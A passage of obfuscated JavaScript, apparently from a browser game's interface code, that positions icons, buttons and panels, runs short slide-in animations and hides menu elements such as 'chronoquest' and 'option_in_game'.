			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⵠⲆᐃ].id = ᐃᐃⲆ.ΔⵠⵠⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆᐃΔΔᐃⵠ], ΔⲆᐃⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆⲆᐃ].id = ᐃᐃ.ΔⵠⲆⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⲆⲆΔΔⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆⲆᐃ].id = ᐃᐃ.ΔⵠⲆⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⵠΔᐃⵠⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆⲆᐃ].id = ᐃᐃⲆ.ΔⵠⲆⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⲆⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃΔᐃⵠᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⲆⲆᐃ].id = ᐃᐃ.ⵠⵠⲆⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⲆⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠᐃΔΔᐃ], ᐃⲆᐃᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⲆⲆᐃ].id = ᐃᐃ.ⵠⵠⲆⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⲆⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⲆⲆᐃ].id = ᐃᐃⲆ.ⵠⵠⲆⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⲆΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆᐃΔⲆⵠᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⲆΔᐃ].id = ᐃᐃ.ΔⲆⲆΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃⵠⲆᐃᐃ], ΔΔᐃΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆΔᐃ].id = ᐃᐃ.ΔⲆⲆΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⵠⵠᐃⲆⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⲆⲆΔᐃ].id = ᐃᐃⲆ.ΔⲆⲆΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⵠⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠᐃΔΔΔⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⵠⲆᐃ].id = ᐃᐃ.ⵠⲆⵠⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⵠⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⵠⲆᐃ].id = ᐃᐃ.ⵠⲆⵠⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⵠⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠΔⲆᐃᐃⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⵠⲆᐃ].id = ᐃᐃⲆ.ⵠⲆⵠⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔᐃⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⲆⵠᐃ], ᐃᐃⲆⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔᐃⲆⲆ].id = ᐃᐃ.ⵠΔᐃⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔᐃⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⲆΔΔⲆⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔᐃⲆⲆ].id = ᐃᐃ.ⵠΔᐃⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⵠΔΔᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠΔⲆᐃΔⵠᐃⲆᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⵠΔΔᐃⵠ].id = ᐃᐃ.ΔᐃⵠΔΔᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⵠΔΔᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⲆⲆⲆⲆⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⵠΔΔᐃⵠ].id = ᐃᐃ.ΔᐃⵠΔΔᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃᐃⵠⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆⵠᐃᐃⵠᐃⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃᐃⵠⵠΔ].id = ᐃᐃ.ᐃⵠᐃᐃⵠⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃᐃⵠⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⵠⵠⲆⵠᐃⲆΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃᐃⵠⵠΔ].id = ᐃᐃ.ᐃⵠᐃᐃⵠⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃⵠⵠᐃᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠΔⲆΔᐃΔᐃⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃⵠⵠᐃᐃⵠ].id = ᐃᐃ.ᐃᐃⵠⵠᐃᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃⵠⵠᐃᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆΔⲆΔᐃⲆᐃ], ⵠⲆΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃⵠⵠᐃᐃⵠ].id = ᐃᐃ.ᐃᐃⵠⵠᐃᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⲆⲆᐃⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⵠⵠⲆΔΔⵠⵠ], ᐃⵠⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⲆⲆᐃⲆΔ].id = ᐃᐃ.ΔⲆⲆⲆᐃⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆⲆᐃⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠⲆⵠΔⲆⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆⲆᐃⲆΔ].id = ᐃᐃ.ΔⲆⲆⲆᐃⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⲆᐃⲆΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆⵠⵠⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⲆᐃⲆΔⲆ].id = ᐃᐃ.ΔΔⲆᐃⲆΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⲆᐃⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃᐃᐃΔᐃᐃⵠ], ⵠⲆΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⲆᐃⲆΔⲆ].id = ᐃᐃ.ΔΔⲆᐃⲆΔⲆ;
			this.ⵠᐃΔΔⵠᐃΔ = function() {
				var ⵠΔΔⲆ = ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ;
				var Δⵠ = ᐃΔⲆᐃⵠ;
				var ⲆⵠⲆ = ⲆⲆᐃΔΔ;
				for (var ⵠᐃ = Δᐃᐃᐃ; ⵠΔΔⲆ.length > ⵠᐃ; ⵠᐃ++) {
					ⵠⲆᐃⵠ < ⵠᐃ && !(ⵠᐃ % 4) && (Δⵠ += ⵠΔΔⲆ[0].info.width + 10, ⲆⵠⲆ = 10);
					ⵠΔΔⲆ[ⵠᐃ].info.translate.x = Δⵠ;
					ⵠΔΔⲆ[ⵠᐃ].info.translate.y = ⲆⵠⲆ;
					ⲆⵠⲆ += 10 + ⵠΔΔⲆ[ⵠᐃ].info.height
				}
			};
			this.ᐃᐃⲆΔⲆⲆΔ = function() {
				var Δⵠ = Math.floor((10 + this.ⵠⵠΔ[0].info.ᐃⵠ[0].width) * Math.floor((3 + ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ.length) / ⵠⵠΔᐃΔ) + 35);
				for (var ⵠᐃ = 0; ⵠᐃ < this.ⵠⵠΔ.length; ⵠᐃ++) {
					if (!this.ⵠⵠΔ[ⵠᐃ]) continue;
					this.ⵠⵠΔ[ⵠᐃ].info.translate.x = Δⵠ;
					this.ⵠⵠΔ[ⵠᐃ].info.translate.y = 22
				}
				this.ⲆⲆⲆⵠᐃΔΔ.info.translate.x = Δⵠ + ᐃⵠᐃⵠᐃⵠⲆ;
				this.ⲆⲆⲆⵠᐃΔΔ.info.translate.y = 22 + ⵠⲆ[Ⲇ.ᐃΔⵠΔΔᐃⲆ].height;
				this.ΔⲆΔᐃΔⵠᐃ.info.translate.x = Δⵠ + ⵠᐃⲆⲆⵠΔΔ;
				this.ΔⲆΔᐃΔⵠᐃ.info.translate.y = 30;
				this.ⵠᐃⵠΔᐃⵠⲆ.info.translate.x = Δⵠ + ⲆᐃⲆⲆΔⲆⲆ;
				this.ⵠᐃⵠΔᐃⵠⲆ.info.translate.y = 22 + ⵠⲆ[Ⲇ.ᐃΔⵠΔΔᐃⲆ].height
			};
			this.ⵠᐃΔᐃΔⲆⵠⵠⵠ = function() {
				var Δⵠ = Math.floor((ΔΔΔᐃ - ⵠⲆ[Ⲇ.ⵠⲆⵠᐃⵠⵠᐃ][Δⵠᐃ].width) / ᐃⲆΔⲆ);
				for (var ⵠᐃ = ΔⲆⲆ; this.ᐃΔⵠΔᐃ.length > ⵠᐃ; ⵠᐃ++) {
					this.ᐃΔⵠΔᐃ[ⵠᐃ].button.info.translate.x = Δⵠ;
					this.ᐃΔⵠΔᐃ[ⵠᐃ].button.info.translate.y = -ⲆⵠΔⵠΔΔΔ
				}
			};
			this.ᐃⵠⵠᐃΔᐃⵠ = function() {
				var Δⵠ = 12 + Math.floor(Math.floor((ΔᐃⲆΔ + ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ.length) / 4) * (10 + this.ΔⵠⲆᐃΔⲆⵠ.info.ᐃⵠ[ⵠⲆᐃⵠ].width) + 35);
				this.ΔⵠⲆᐃΔⲆⵠ.info.translate.x = Δⵠ;
				this.ΔⵠⲆᐃΔⲆⵠ.info.translate.y = 33;
				this.ᐃᐃⵠⵠᐃⵠⵠ.info.translate.x = this.ΔⵠⲆᐃΔⲆⵠ.info.translate.x;
				this.ᐃᐃⵠⵠᐃⵠⵠ.info.translate.y = 137;
				this.ⵠΔᐃⵠⵠⲆⲆ.info.translate.x = this.ΔⵠⲆᐃΔⲆⵠ.info.translate.x;
				this.ⵠΔᐃⵠⵠⲆⲆ.info.translate.y = 240
			};
			this.ⲆΔΔⵠⲆᐃΔ = function() {
				var Δⵠ = 12 + Math.floor(Math.floor((ⵠⲆΔⵠΔ + ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ.length) / ⲆⲆⲆΔ) * (ᐃⵠᐃΔⵠ + this.ΔΔΔⲆⵠⵠⵠ.info.ᐃⵠ[ⵠⲆᐃⵠ].width) + 35);
				this.ΔΔΔⲆⵠⵠⵠ.info.translate.x = Δⵠ;
				this.ΔΔΔⲆⵠⵠⵠ.info.translate.y = 36;
				Δⵠ += 83;
				this.ΔⵠΔΔᐃᐃΔ.info.translate.x = Δⵠ;
				this.ΔⵠΔΔᐃᐃΔ.info.translate.y = 36;
				this.ⲆΔⵠᐃⲆᐃⵠ.info.translate.x = Δⵠ;
				this.ⲆΔⵠᐃⲆᐃⵠ.info.translate.y = 36;
				this.ΔᐃⲆⵠⲆΔᐃ.info.translate.x = Δⵠ;
				this.ΔᐃⲆⵠⲆΔᐃ.info.translate.y = 36;
				this.ᐃΔΔᐃⲆⵠⲆ.info.translate.x = Δⵠ;
				this.ᐃΔΔᐃⲆⵠⲆ.info.translate.y = 36;
				this.ΔⲆⲆΔⵠⵠⲆ.info.translate.x = Δⵠ;
				this.ΔⲆⲆΔⵠⵠⲆ.info.translate.y = 36
			};
			this.ΔΔᐃⲆΔⵠⵠ = function() {
				var Δⵠ = 12 + Math.floor((10 + this.ⵠΔᐃΔΔⲆⵠ.info.ᐃⵠ[Ⲇᐃⵠⵠ].width) * Math.floor((ᐃⵠⲆΔᐃ + ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ.length) / 4) + 35);
				this.ⵠΔᐃΔΔⲆⵠ.info.translate.x = Δⵠ;
				this.ⵠΔᐃΔΔⲆⵠ.info.translate.y = 36;
				Δⵠ += 83;
				this.ⵠΔΔᐃΔⲆᐃ.info.translate.x = Δⵠ;
				this.ⵠΔΔᐃΔⲆᐃ.info.translate.y = 36
			};
			this.ᐃΔⵠⲆⲆⵠΔ = function() {
				var Δⵠ = Math.floor(Math.floor((ΔᐃⲆΔ + ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ.length) / 4) * (10 + this.ΔᐃᐃⵠⲆⵠᐃ.info.ᐃⵠ[ᐃΔΔ].width) + 35);
				this.ΔᐃᐃⵠⲆⵠᐃ.info.translate.x = Δⵠ;
				this.ΔᐃᐃⵠⲆⵠᐃ.info.translate.y = 22
			};
			this.ᐃⵠᐃⲆᐃⲆΔ = function() {
				var ⲆⵠⲆⵠ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ;
				if (ⲆⵠⲆⵠ.length > 0) var ΔⲆΔΔⵠΔⲆⵠΔ = Math.floor((ΔΔΔᐃ - ᐃᐃΔ.ⲆⵠⲆⵠ.max * (ⲆⵠⲆⵠ[0].info.width + 5)) / ⵠⵠΔⲆ);
				for (var ⵠᐃ = 0; ⵠᐃ < ⲆⵠⲆⵠ.length; ⵠᐃ++) {
					ⲆⵠⲆⵠ[ⵠᐃ].info.translate.x = ΔⲆΔΔⵠΔⲆⵠΔ + ⵠᐃ * (ⲆⵠⲆⵠ[ⵠᐃ].info.width + ΔⵠⲆⲆ);
					ⲆⵠⲆⵠ[ⵠᐃ].info.translate.y = ⵠⲆᐃⲆ - ⲆⵠⲆⵠ[ⵠᐃ].info.width - ⲆⲆⲆΔᐃ;
					this.ΔΔᐃⵠⲆ[ⲆⵠⲆⵠ[ⵠᐃ].id].info.translate.x = ⲆⵠⲆⵠ[ⵠᐃ].info.translate.x + ⲆⵠⵠⵠⵠᐃΔ;
					this.ΔΔᐃⵠⲆ[ⲆⵠⲆⵠ[ⵠᐃ].id].info.translate.y = ⲆⵠⲆⵠ[ⵠᐃ].info.translate.y - this.ΔΔᐃⵠⲆ[ⲆⵠⲆⵠ[ⵠᐃ].id].info.ᐃⵠ[Δⵠᐃ].height - ΔᐃⲆᐃ
				}
			};
			var ΔⲆⲆⲆΔ = Ⲇᐃᐃᐃ;
			var ΔᐃΔᐃᐃ = 30;
			var ΔⵠᐃⲆΔⲆΔ = function() {
				ᐃᐃᐃ.ⵠⲆᐃ();
				ΔⲆⲆⲆΔ++;
				if (ΔᐃΔᐃᐃ == ΔⲆⲆⲆΔ) {
					ᐃᐃᐃ.ᐃⲆᐃⲆᐃⲆΔ();
					ᐃᐃᐃ.ⵠⲆᐃ();
					return
				}
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ΔⵠᐃⲆΔⲆΔ, 0)
			};
			this.ⵠΔΔΔᐃ = function(ΔⲆⵠΔΔ) {
				ᐃᐃΔ.ⵠⵠⲆᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃΔ.ⵠⵠⲆᐃᐃ.ⵠΔΔΔᐃ();
				ᐃᐃΔ.ᐃᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃΔ.ᐃᐃᐃⲆΔ.ⵠΔΔΔᐃ();
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]).style.display = ⵠ[465];
				ᐃᐃᐃ.ⲆⵠⵠⲆᐃ.style.display = ⵠ[465];
				ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
				ᐃᐃᐃ.sign.style.display = ⵠ[465];
				ᐃᐃᐃ.sign[ΔᐃⲆⵠⲆⵠΔ[72]] = ⲆΔᐃⲆΔ;
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[412]).style.display = ⵠ[465];
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[300]).style.display = ⵠ[465];
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[438]).style.display = ⵠ[465];
				ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
				document[ΔᐃⲆⵠⲆⵠΔ[68]]("option_in_game").style.display = ⵠ[465];
				ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
				document[ΔᐃⲆⵠⲆⵠΔ[68]]("sure_delete").style.display = ⵠ[465];
				ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[77]).style.display = ⵠ[465];
				ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] = ⲆⲆᐃⵠᐃ;
				document[ΔᐃⲆⵠⲆⵠΔ[68]]("chronoquest").style.display = ⵠ[465];
				ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
				ⲆΔⲆΔᐃ = ΔⲆⵠΔΔ;
				ᐃᐃᐃ.ⵠᐃΔⲆΔⵠⲆ();
				ᐃᐃᐃ.Ⲇⵠ.style.cursor = ᐃᐃᐃ.ᐃⵠⲆᐃᐃΔⵠ;
				ⲆⲆⵠⲆ.ⵠΔΔΔᐃ();
				ᐃΔΔᐃⵠ = -ⵠΔⵠΔ;
				ⵠⲆⲆᐃΔ();
				ᐃⲆⵠᐃΔⵠⵠ()
			};
			var ⲆΔⲆΔᐃ;
			var ᐃΔΔᐃⵠ = -ᐃᐃⲆΔ;
			var ᐃⲆΔΔᐃ = 30;
			var ⵠⲆⲆᐃΔ = function() {
				ᐃᐃᐃ.ⵠⲆᐃ();
				ᐃΔΔᐃⵠ++;
				if (ᐃΔΔᐃⵠ == ᐃⲆΔΔᐃ) {
					ᐃᐃᐃ.stop();
					ⲆΔⲆΔᐃ();
					return
				}
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ⵠⲆⲆᐃΔ, 0)
			};
			this.ⲆΔⲆᐃⵠ = false;
			this.stop = function() {
				this.ⲆΔⲆᐃⵠ = false
			};
			this.ⲆΔΔᐃⵠ = function() {
				ΔⵠⲆᐃ.ⲆᐃⲆᐃΔⲆⵠΔᐃ();
				ᐃᐃᐃ.ⲆΔⲆᐃⵠ = ΔᐃⲆⵠⵠ;
				ᐃΔΔᐃⵠ = -1;
				ΔⲆⲆⲆΔ = 0;
				ΔⵠᐃⲆΔⲆΔ()
			};
			this.ⵠⲆᐃ = function() {
				this.ⲆⲆⵠΔᐃ.translate.x = ΔΔΔᐃ - this.ⲆⲆⵠΔᐃ.ᐃⵠ.width - 10;
				this.ⲆⲆⵠΔᐃ.translate.y = 5;
				ⲆⲆⲆ.ⲆΔΔΔⵠ.translate.x = this.ⲆⲆⵠΔᐃ.translate.x - ⵠⲆ[Ⲇ.ᐃⵠΔᐃⲆⲆᐃ][ⵠⲆⲆ].width - 85;
				ⲆⲆⲆ.ⲆΔΔΔⵠ.translate.y = ⲆⵠⲆⵠⲆ;
				this.ΔΔΔΔ.button.info.translate.x = this.ⲆⲆⵠΔᐃ.translate.x - ⵠⲆ[Ⲇ.ⲆᐃᐃⲆΔᐃⵠ][ⵠⲆᐃⵠ].width - 10;
				this.ΔΔΔΔ.button.info.translate.y = 10;
				this.ᐃⲆᐃⲆ.button.info.translate.x = this.ⲆⲆⵠΔᐃ.translate.x - ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠΔΔ][0].width - ΔⲆᐃᐃᐃⲆⲆ;
				this.ᐃⲆᐃⲆ.button.info.translate.y = this.ΔΔΔΔ.button.info.translate.y + ⵠⲆ[Ⲇ.ⲆᐃᐃⲆΔᐃⵠ][ⵠᐃⲆᐃ].height + ᐃⲆⵠΔ;
				this.options.button.info.translate.x = this.ⲆⲆⵠΔᐃ.translate.x - ⵠⲆ[Ⲇ.ⲆΔⵠⵠⲆ][0].width - ΔⲆᐃᐃᐃⲆⲆ;
				this.options.button.info.translate.y = this.ᐃⲆᐃⲆ.button.info.translate.y + ⵠⲆ[Ⲇ.ⲆΔⵠⵠⲆ][0].height + 18;
				this.ⲆⲆⵠⲆ.ⲆΔΔⲆⵠᐃⲆ.info.translate.x = this.ⲆⲆⵠΔᐃ.translate.x - ⵠⲆ[Ⲇ.ⲆΔⵠⵠⲆ][ᐃⵠⲆⵠ].width - ⲆΔⲆⲆΔ;
				this.ⲆⲆⵠⲆ.ⲆΔΔⲆⵠᐃⲆ.info.translate.y = this.options.button.info.translate.y + ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⲆᐃ][0].height;
				this.ⲆⲆⵠⲆ.ΔᐃᐃⲆᐃᐃᐃ.info.translate.x = this.ⲆⲆⵠΔᐃ.translate.x - ⵠⲆ[Ⲇ.ⲆΔⵠⵠⲆ][0].width - 20;
				this.ⲆⲆⵠⲆ.ΔᐃᐃⲆᐃᐃᐃ.info.translate.y = this.options.button.info.translate.y + ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⲆᐃ][0].height;
				this.ⲆⵠⵠⲆᐃ.button.info.translate.x = this.ⲆⲆⵠΔᐃ.translate.x - ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔΔⲆ][0].width - ΔᐃⲆⵠᐃ;
				this.ⲆⵠⵠⲆᐃ.button.info.translate.y = this.ⲆⲆⵠⲆ.ⲆΔΔⲆⵠᐃⲆ.info.translate.y + ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔΔⲆ][0].height;
				ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.x = this.ⲆⲆⵠΔᐃ.translate.x - 63 - 85;
				ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y = ᐃᐃᐃⵠⵠⲆⵠ;
				ᐃᐃΔ.ᐃⵠⲆᐃⵠ.translate.x = this.ⲆⲆⵠΔᐃ.translate.x - ⵠⲆ[Ⲇ.ⲆⲆⲆⵠΔΔⵠ].width - 85;
				ᐃᐃΔ.ᐃⵠⲆᐃⵠ.translate.y = ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y + 10 + ⵠⲆ[Ⲇ.ΔⵠⵠᐃⲆᐃⲆ].height;
				this.ᐃⵠΔⲆⵠ.translate.y = ⵠⲆᐃⲆ - ⵠⲆΔⵠΔ - 193;
				this.ᐃⵠΔⲆⵠ.translate.x = ΔΔΔᐃ - 3 - 193;
				this.ⲆΔⲆⵠ.translate.x = 5;
				this.ⲆΔⲆⵠ.translate.y = ⵠⲆᐃⲆ - this.ⲆΔⲆⵠ.ᐃⵠ.height - ᐃⲆⵠΔ;
				this.ΔᐃᐃⲆΔ.button.info.translate.x = Δᐃⵠᐃ - 91 / Ⲇⵠⵠᐃ;
				this.ΔᐃᐃⲆΔ.button.info.translate.y = 50;
				this.ⵠᐃΔΔⵠᐃΔ();
				this.ᐃⵠᐃⲆᐃⲆΔ();
				this.ᐃᐃⲆΔⲆⲆΔ();
				this.ᐃΔⵠⲆⲆⵠΔ();
				this.ΔΔᐃⲆΔⵠⵠ();
				this.ⲆΔΔⵠⲆᐃΔ();
				this.ᐃⵠⵠᐃΔᐃⵠ();
				this.ⵠᐃΔᐃΔⲆⵠⵠⵠ();
				this.sign.ΔΔᐃΔⵠΔⲆ();
				ΔᐃᐃⲆⲆⵠⵠ();
				ᐃᐃΔ.ⵠⵠⲆᐃᐃ.ⵠⲆᐃ();
				ᐃᐃΔ.ᐃᐃᐃⲆΔ.ⵠⲆᐃ();
				this.ⲆⵠⲆᐃᐃᐃⵠⲆⲆ.ⵠⲆᐃ();
				this.ΔΔΔΔ.ⲆⵠᐃⲆⵠⵠᐃ.ⵠⲆᐃ();
				this.ΔΔΔΔ.list.ⵠⲆᐃ();
				this.ⵠⵠᐃᐃ.ⵠⲆᐃ();
				this.ⵠΔⵠⲆⵠ.ⵠⲆᐃ();
				this.ᐃⲆᐃⲆ.ⵠⲆᐃ();
				this.ΔᐃᐃⲆΔ.ⵠⲆᐃ();
				this.options.ⵠⲆᐃ();
				this.ⲆⵠⵠⲆᐃ.ⵠⲆᐃ();
				this.sign.ⵠⲆᐃ();
				var ΔᐃⵠΔ = ⲆⲆⲆᐃ;
				if (ΔᐃΔᐃᐃ != ΔⲆⲆⲆΔ) {
					var ΔᐃⵠΔ = 1500 / (ΔⲆⲆⲆΔ + ΔⲆᐃᐃ) - 50
				}
				if (ᐃΔΔᐃⵠ != -ⵠᐃⵠΔ) {
					var ΔᐃⵠΔ = -(1500 / (ᐃⲆΔΔᐃ - ᐃΔΔᐃⵠ + 1) - 48)
				}
				this.ΔᐃᐃⲆΔ.button.info.translate.y -= ΔᐃⵠΔ > 0 ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				this.ⲆⲆⵠΔᐃ.translate.y -= ΔᐃⵠΔ > ⵠⲆⲆ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				ᐃᐃΔ.ⵠⲆⵠᐃᐃ.translate.y -= ΔᐃⵠΔ > ⵠΔⲆⵠ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				ᐃᐃΔ.ᐃⵠⲆᐃⵠ.translate.y -= Δᐃᐃⵠ < ΔᐃⵠΔ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				this.ΔΔΔΔ.button.info.translate.y -= ΔᐃⵠΔ > ΔΔⵠ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				this.ᐃⲆᐃⲆ.button.info.translate.y -= ΔΔⵠⵠ < ΔᐃⵠΔ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				this.options.button.info.translate.y -= ΔᐃⵠΔ > 0 ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				this.ⲆⵠⵠⲆᐃ.button.info.translate.y -= ΔᐃⵠΔ > ΔⲆⵠⲆ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				this.ⲆⲆⵠⲆ.ⲆΔΔⲆⵠᐃⲆ.info.translate.y -= ΔᐃⵠΔ > ΔⲆⵠⲆ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				this.ⲆⲆⵠⲆ.ΔᐃᐃⲆᐃᐃᐃ.info.translate.y -= 0 < ΔᐃⵠΔ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				ⲆⲆⲆ.ⲆΔΔΔⵠ.translate.y -= ΔᐃⵠΔ > 0 ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				this.ⲆΔⲆⵠ.translate.y -= ΔⲆⵠⲆ > ΔᐃⵠΔ ? ΔᐃⵠΔ : -ΔᐃⵠΔ;
				this.ᐃⵠΔⲆⵠ.translate.y -= ΔᐃⵠΔ < ᐃⵠⲆ ? ΔᐃⵠΔ : -ΔᐃⵠΔ
			};
			this.ᐃΔΔⲆⵠⲆΔᐃΔ = function() {
				if (!ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.enabled && this.ᐃᐃΔⵠⵠⵠⲆ && !ᐃᐃΔ.ⵠⵠⲆⵠⵠ) ΔⲆᐃⲆΔⲆⵠᐃⵠ();
				Ⲇᐃⵠⵠⵠᐃᐃⵠᐃ();
				ΔΔᐃⵠΔⵠᐃⵠᐃ();
